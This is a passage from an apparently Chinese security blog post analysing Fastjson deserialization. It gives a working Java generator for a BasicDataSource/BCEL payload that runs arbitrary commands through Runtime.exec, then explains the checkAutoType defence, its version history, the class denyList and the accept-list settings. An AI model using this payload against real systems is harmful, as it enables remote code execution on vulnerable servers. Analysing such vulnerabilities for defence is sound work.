<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getConnection:753, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">write:-1, ASMSerializer_1_BasicDataSource (com.alibaba.fastjson.serializer)</span><br><span class="line">write:251, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:275, JSONSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSONString:799, JSON (com.alibaba.fastjson)</span><br><span class="line">toString:793, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:436, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">main:18, Main</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>payload 生成代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BuildFastjsonBasicDataSourcePayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPayload</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">bcelCode</span> <span class="operator">=</span> generateBCELCode(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;aaa\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span> + bcelCode + <span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;: \&quot;bbb\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">generateBCELCode</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Utility.encode(getEvilClass(cmd), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="checkAutoType-绕过"><a href="#checkAutoType-绕过" class="headerlink" title="checkAutoType 绕过"></a>checkAutoType 绕过</h1><h2 id="checkAutoType-安全机制"><a href="#checkAutoType-安全机制" class="headerlink" title="checkAutoType 安全机制"></a>checkAutoType 安全机制</h2><p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制：</p>
<ul>
<li>默认情况下 <strong><code>autoTypeSupport</code> &#x3D; false</strong>，不允许任意类反序列化。</li>
<li>而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。</li>
</ul>
<p>在后续版本中，checkAutoType 安全机制被不断修补加固，时间线如下：</p>
<table>
<thead>
<tr>
<th>时间&#x2F;版本</th>
<th>变化要点</th>
<th>依据</th>
</tr>
</thead>
<tbody><tr>
<td><strong>2017-03-15（1.2.14.sec01 分支）</strong></td>
<td><strong>首次引入 <code>checkAutoType()</code> 与“可配置”黑&#x2F;白名单</strong>：新增系统属性 <code>fastjson.parser.autoTypeSupport</code>（是否允许 autoType）、<code>fastjson.parser.autoTypeAccept</code>（白名单前缀，可多值）、<code>fastjson.parser.deny</code>（黑名单前缀）。运行时通过 <code>addItemsToAccept/Deny</code> 注入；<code>checkAutoType</code> 先白&#x2F;黑名单匹配再加载类。此时主要是<strong>“可配置白名单”</strong>，<strong>不是</strong>大而全的“内置白名单”。</td>
<td>变更 diff 展示了属性常量与 <code>checkAutoType</code> 主体引入（<code>ParserConfig.java</code>），以及 <code>parseObject</code> 调用改为 <code>config.checkAutoType(...)</code>。［<a class="link"   target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］；同日官方安全公告“security_update_20170315”。［<a class="link"   target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/security_update_20170315?utm_source=chatgpt.com" >GitHub Wiki<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
<tr>
<td><strong>≤1.2.24</strong></td>
<td>历史上 <code>autoType</code> 在很多场景等同于“可用&#x2F;易被绕过”；多条利用链公开。</td>
<td>社区长文时间轴与复现。［<a class="link"   target="_blank" rel="noopener" href="https://medium.com/%40knownsec404team/fastjson-deserialization-vulnerability-history-5206714ceed1?utm_source=chatgpt.com" >Medium<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://cn-sec.com/archives/441283.html?utm_source=chatgpt.com" >cn-sec.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
<tr>
<td><strong>1.2.25</strong></td>
<td>**默认关闭 <code>autoType</code>**（除非显式开启或白名单命中）；继续沿用黑&#x2F;白名单思路。</td>
<td>社区时间轴与 CVE-2017-18349 的“1.2.25 之前可 RCE”描述。［<a class="link"   target="_blank" rel="noopener" href="https://medium.com/%40knownsec404team/fastjson-deserialization-vulnerability-history-5206714ceed1?utm_source=chatgpt.com" >Medium<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-18349?utm_source=chatgpt.com" >NVD<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2017-18349/?utm_source=chatgpt.com" >CVE Details<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
<tr>
<td><strong>1.2.42</strong></td>
<td><strong>黑&#x2F;白名单查找由明文前缀 → 64 位哈希（FNV-1a）+ 二分查找</strong>：<code>denyHashCodes</code> &#x2F; <code>acceptHashCodes</code>；同时<strong>限制 <code>typeName</code> 长度（&lt;3 或 ≥128 拒绝）</strong>。注意：这时<strong>白名单字符串常量仍保留</strong>，只是运行时计算其哈希做查找。</td>
<td>“bug fixed autoType denyList check” 提交里可见 <code>TypeUtils.fnv1a_64(name)</code>、<code>Arrays.binarySearch(...)</code>，以及长度校验。［<a class="link"   target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
<tr>
<td><strong>1.2.61</strong></td>
<td><strong>黑名单常量从十进制 long → 十六进制（小写）</strong>，属于“隐藏可搜索特征”的编码层面变化。</td>
<td>“update blacklist” 提交可见十进制改为十六进制字面量。［<a class="link"   target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
<tr>
<td><strong>1.2.62</strong></td>
<td><strong>十六进制字面量改为大写</strong>并<strong>扩充黑名单</strong>（如 <code>net.sf.cglib.</code>, <code>oracle.jdbc.</code>, <code>jdk.internal.</code>, <code>org.objectweb.asm.</code> 等），继续以哈希表呈现。</td>
<td>“add autoType blacklist” 提交。［<a class="link"   target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/commit/014444e6c62329ec7878bb6b0c6b28c3f516c54e" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
<tr>
<td><strong>1.2.67</strong></td>
<td><strong>“内置白名单也哈希化”</strong>：把原先源码里的<strong>白名单字符串数组</strong>（大量 Spring&#x2F;JDBC&#x2F;Security 等类名）<strong>整块删除</strong>，改为 <code>INTERNAL_WHITELIST_HASHCODES</code>（FNV-1a 值，已排序）。这是白名单<strong>表现形式</strong>的关键转折点。</td>
<td>“update whitelist” 提交的 diff 一边是被删除的<strong>明文白名单类型列表</strong>（<code>String[] types = &#123;...&#125;</code>），一边是新的 <code>INTERNAL_WHITELIST_HASHCODES</code>。［<a class="link"   target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/commit/84eca8e56003ff6ebad3da19c6d69dcd842dbdf7" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
<tr>
<td><strong>1.2.68</strong></td>
<td><strong>引入 SafeMode</strong>：一旦开启，<strong>完全禁用 <code>@type</code>&#x2F;autoType</strong>（黑&#x2F;白名单都不再放行）。支持<strong>代码、JVM 参数、配置文件</strong>三种开启方式。</td>
<td>官方 SafeMode 说明与安全通报。［<a class="link"   target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode_en?utm_source=chatgpt.com" >GitHub Wiki<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://nsfocusglobal.com/fastjson-1-2-68-and-earlier-remote-code-execution-vulnerability-threat-alert/?utm_source=chatgpt.com" >NSFOCUS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
<tr>
<td><strong>1.2.83（2022-05-22）</strong></td>
<td><strong>修复 CVE-2022-25845</strong>（再一次的 autoType 绕过 → RCE）；官方呼吁升级或启用 SafeMode。</td>
<td>JFrog 技术分析与 NVD 条目。［<a class="link"   target="_blank" rel="noopener" href="https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/?utm_source=chatgpt.com" >JFrog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2022-25845?utm_source=chatgpt.com" >NVD<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
<tr>
<td><strong>2024-10-23</strong></td>
<td><strong>fastjson 1.x 仓库被归档</strong>；官方推荐使用 <strong>fastjson2</strong>（重新设计，默认更安全）。</td>
<td>仓库页顶“archived by the owner on Oct 23, 2024”。［<a class="link"   target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>］</td>
</tr>
</tbody></table>
<h3 id="相关结构与配置"><a href="#相关结构与配置" class="headerlink" title="相关结构与配置"></a>相关结构与配置</h3><p>安全更新主要集中在 <code>com.alibaba.fastjson.parser.ParserConfig</code>，首先查看类上出现了几个成员变量：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> AUTO_SUPPORT;</span><br><span class="line"><span class="keyword">private</span> String[] denyList = <span class="string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span>.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> String[] acceptList = AUTO_TYPE_ACCEPT_LIST;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>布尔型的 <code>autoTypeSupport</code>，用来标识是否开启任意类型的反序列化，<strong>并且默认关闭</strong>；</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个常量字符串，用来读取系统属性开关的 key</span></span><br><span class="line"><span class="comment">// 如果 JVM 启动参数里带有 -Dfastjson.parser.autoTypeSupport=true/false</span></span><br><span class="line"><span class="comment">// 就会被这里捕获，用于控制 AutoType 功能是否启用</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">AUTOTYPE_SUPPORT_PROPERTY</span> <span class="operator">=</span> <span class="string">&quot;fastjson.parser.autoTypeSupport&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个全局常量，用于标识是否默认启用 AutoType</span></span><br><span class="line"><span class="comment">// 其值由上面的静态代码块初始化决定</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> AUTO_SUPPORT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span>  &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态初始化块：类加载时就会执行</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 从系统属性中读取 fastjson.parser.autoTypeSupport 的值</span></span><br><span class="line">        <span class="comment">// IOUtils.getStringProperty 会调用 System.getProperty()</span></span><br><span class="line">        <span class="comment">// 如果没有设置该属性，返回 null</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">property</span> <span class="operator">=</span> IOUtils.getStringProperty(AUTOTYPE_SUPPORT_PROPERTY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断属性值是否等于 &quot;true&quot;</span></span><br><span class="line">        <span class="comment">// 如果等于 &quot;true&quot;，则开启 AutoType 支持，否则关闭</span></span><br><span class="line">        AUTO_SUPPORT = <span class="string">&quot;true&quot;</span>.equals(property);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 ParserConfig 类中，定义一个实例变量 autoTypeSupport</span></span><br><span class="line"><span class="comment">// 默认值来自全局常量 AUTO_SUPPORT</span></span><br><span class="line"><span class="comment">// 这样每个 ParserConfig 实例都会继承全局的 AutoType 配置</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> AUTO_SUPPORT;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>字符串数组 <code>denyList</code> ，是反序列化类的黑名单；其中黑名单 <code>denyList</code> 包括：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh </span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure></div>

<p>黑名单中的元素支持动态添加：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个系统属性的 key，用于指定 AutoType 的“黑名单”类前缀</span></span><br><span class="line"><span class="comment">// 如果 JVM 启动参数里设置了 -Dfastjson.parser.deny=xxx,yyy,...</span></span><br><span class="line"><span class="comment">// 就会在 fastjson 启动时加载这些前缀作为禁止反序列化的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">DENY_PROPERTY</span> <span class="operator">=</span> <span class="string">&quot;fastjson.parser.deny&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局静态黑名单数组，用来存放禁止的类名前缀</span></span><br><span class="line"><span class="comment">// 在类加载时会被初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DENYS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 从系统属性中读取 fastjson.parser.deny 的值</span></span><br><span class="line">        <span class="comment">// 比如：System.getProperty(&quot;fastjson.parser.deny&quot;)</span></span><br><span class="line">        <span class="comment">// 可能返回 &quot;com.malicious.,org.exploit.&quot;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">property</span> <span class="operator">=</span> IOUtils.getStringProperty(DENY_PROPERTY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 splitItemsFormProperty 对字符串进行分割</span></span><br><span class="line">        <span class="comment">// 结果会是一个 String[]，每个元素代表一个禁止的类前缀</span></span><br><span class="line">        <span class="comment">// 如果 property = null，则返回 null</span></span><br><span class="line">        DENYS = splitItemsFormProperty(property);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在构造函数中，<code>DENYS</code> 列表中的成员会通过 <code>addItemsToDeny</code> 函数添加到黑名单列表 <code>denyList</code> 中。</p>
</li>
<li><p><code>acceptList</code> 是反序列化白名单。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个系统属性的 key，用于指定 AutoType 的“白名单”类前缀</span></span><br><span class="line"><span class="comment">// 如果 JVM 启动参数里设置了 -Dfastjson.parser.autoTypeAccept=xxx,yyy,...</span></span><br><span class="line"><span class="comment">// 就可以通过该属性为 fastjson 增加一批允许的类前缀</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">AUTOTYPE_ACCEPT</span> <span class="operator">=</span> <span class="string">&quot;fastjson.parser.autoTypeAccept&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局静态白名单数组，用来存放允许的类名前缀</span></span><br><span class="line"><span class="comment">// 在类加载时会被初始化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] AUTO_TYPE_ACCEPT_LIST;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span>  &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 从系统属性中读取 fastjson.parser.autoTypeAccept 的值</span></span><br><span class="line">        <span class="comment">// 比如：System.getProperty(&quot;fastjson.parser.autoTypeAccept&quot;)</span></span><br><span class="line">        <span class="comment">// 可能返回 &quot;com.safe.,org.trusted.&quot;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">property</span> <span class="operator">=</span> IOUtils.getStringProperty(AUTOTYPE_ACCEPT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 splitItemsFormProperty 对字符串按逗号、分号等分隔符切分</span></span><br><span class="line">        <span class="comment">// 转换成 String[] 数组</span></span><br><span class="line">        String[] items = splitItemsFormProperty(property);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有设置该属性（返回 null），则初始化为空数组</span></span><br><span class="line">        <span class="keyword">if</span> (items == <span class="literal">null</span>) &#123;</span><br><span class="line">            items = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 赋值给全局白名单数组</span></span><br><span class="line">        AUTO_TYPE_ACCEPT_LIST = items;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 ParserConfig 实例中，定义一个实例级别的白名单数组</span></span><br><span class="line"><span class="comment">// 默认继承自全局的 AUTO_TYPE_ACCEPT_LIST</span></span><br><span class="line"><span class="comment">// 后续也可以通过 addAccept(...) 等方法动态扩展</span></span><br><span class="line"><span class="keyword">private</span> String[] acceptList = AUTO_TYPE_ACCEPT_LIST;</span><br></pre></td></tr></table></figure></div>

<p>添加反序列化白名单有 3 种方法：</p>
<ul>
<li><p><strong>代码方式调用 API</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.example.safe.&quot;</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>系统属性</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dfastjson.parser.autoTypeAccept=com.example.safe.,org.myapp.model.</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>fastjson.properties</code> 配置文件</strong></p>
<p>在 classpath 下放置 <code>fastjson.properties</code>，内容如下：</p>
<div class="code-container" data-rel="Properties"><figure class="iseeu highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">fastjson.parser.autoTypeAccept</span>=<span class="string">com.example.safe.,org.myapp.model.</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<h3 id="安全机制分析"><a href="#安全机制分析" class="headerlink" title="安全机制分析"></a>安全机制分析</h3><p>在 <code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code> 函数中，如果开启了 autoType，先判断类名是否在白名单中，如果在，就使用 <code>TypeUtils.loadClass</code> 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果全局开启了 autoTypeSupport，或者调用时传了期望类 expectClass</span></span><br><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// Step 1: 遍历白名单 acceptList</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) 